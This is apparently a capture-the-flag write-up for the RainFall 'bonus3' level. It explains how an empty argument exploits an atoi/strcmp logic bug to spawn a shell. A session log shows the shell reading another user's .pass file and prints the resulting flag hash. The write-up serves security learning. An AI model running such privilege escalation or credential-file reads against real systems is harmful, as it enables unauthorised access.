# Vulnerability
Logic bug: buffer[atoi(argv[1])] = '\0' allows placing null byte anywhere in buffer.


# Exploitation Strategy
1.atoi("") or atoi("0") returns 0
2.Sets buffer[0] = '\0' making buffer empty string
3.strcmp("", "") returns 0 → true
4.Triggers execl("/bin/sh")


# Understanding the Bug
```sh
# Normal flow:
buffer[0-65]  = first 66 bytes from file
buffer[65]    = '\0'
buffer[atoi(argv[1])] = '\0'  # Place null byte
buffer[66-130] = next 65 bytes from file

# If we compare buffer with argv[1]:
strcmp(buffer, argv[1]) == 0 → shell
```


# Exploitation
```py
#!/usr/bin/env python
# Empty string: atoi("") = 0
# Sets buffer[0] = '\0'
# strcmp("", "") = 0 → SUCCESS!

print ""
# or (print "0"  # atoi("0") = 0, same effect)

```

# Execution
```sh
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```

# Key Concepts

Logic vulnerability
Null byte injection
strcmp() behavior with empty strings
atoi() edge cases
Simple != secure